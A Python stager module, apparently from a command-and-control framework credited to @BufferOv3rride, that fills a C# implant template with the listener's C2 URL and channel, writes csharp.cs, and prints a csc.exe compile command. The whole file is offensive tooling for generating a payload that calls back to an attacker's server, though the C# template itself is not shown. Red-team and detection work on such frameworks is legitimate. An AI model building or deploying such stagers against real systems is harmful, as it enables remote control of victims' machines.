from core.utils import print_good, print_info


class STStager:
    def __init__(self):
        self.name = 'sharp'
        self.description = 'Stage via C# Executable'
        self.author = '@BufferOv3rride'
        self.options = {}

    def generate(self, listener):
        with open('csharp.cs', 'w') as stager:
            with open('stagers/templates/Cexe.cs') as template:
                template = template.read()
                template = template.replace('C2_URL', f"https://{listener['BindIP']}:{listener['Port']}")
                template = template.replace('C2_CHANNEL', f"{listener.name}")
                stager.write(template)

                print_good(f"Generated stager to {stager.name}")
                print_info("Compile with : csc.exe  /out:'C:\Temp\csharp.exe' /platform:x64 C:\Temp\csharp.cs")
